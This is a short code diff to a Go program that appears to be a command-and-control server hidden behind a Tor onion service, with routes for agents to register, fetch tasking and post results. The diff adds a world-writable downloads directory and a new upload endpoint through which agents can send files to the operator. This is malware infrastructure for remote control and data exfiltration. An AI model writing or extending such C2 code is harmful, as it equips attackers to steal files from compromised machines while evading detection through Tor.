@@ -31,6 +31,7 @@ func main() {
 	}
 
 	os.RemoveAll(*config.ApiSockPath)
+	os.MkdirAll(*config.DownloadsDirectoryPath, 0777)
 
 	if err := writeTorrcConfig(config.ApiSockPath, config.OnionServicePath); err != nil {
 		fmt.Println("error: writeTorrcConfig:", err)
@@ -89,6 +90,7 @@ func startOnionService(apiSockPath *string) (err error) {
 	router.HandleFunc("GET /v1/{agentID}", c2ctrl.GetMessages)
 	router.HandleFunc("POST /v1", c2ctrl.InsertMessageResponse)
 	router.HandleFunc("PUT /v1", c2ctrl.InsertAgent)
+	router.HandleFunc("PUT /v1/upload/{fileID}", c2ctrl.UploadFile)
 
 	listener, err := net.Listen("unix", *apiSockPath)
 	if err != nil {
